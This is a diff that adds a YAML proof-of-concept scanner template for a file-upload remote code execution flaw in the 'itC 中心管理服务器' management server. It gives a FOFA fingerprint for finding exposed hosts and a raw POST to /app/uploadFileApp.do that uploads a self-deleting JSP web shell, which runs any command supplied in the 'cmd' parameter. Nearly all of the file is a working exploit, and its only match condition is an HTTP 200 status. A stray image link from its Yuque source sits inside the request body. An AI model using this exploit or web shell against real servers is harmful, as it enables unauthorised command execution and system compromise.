@@ -1,0 +1,43 @@
+id: poc-acqql02e3ufzayim
+info:
+  name: itC 中心管理服务器 uploadFileApp.do 文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/acqql02e3ufzayim'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: acqql02e3ufzayim
+    fofa: body="/mt_res_v3/img/public/logo.ico"
+http:
+- raw:
+  - 'POST /app/uploadFileApp.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+    Content-Type: image/jpeg
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1758455511039-58cfbd20-93f8-46dc-a000-e972973d9419.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
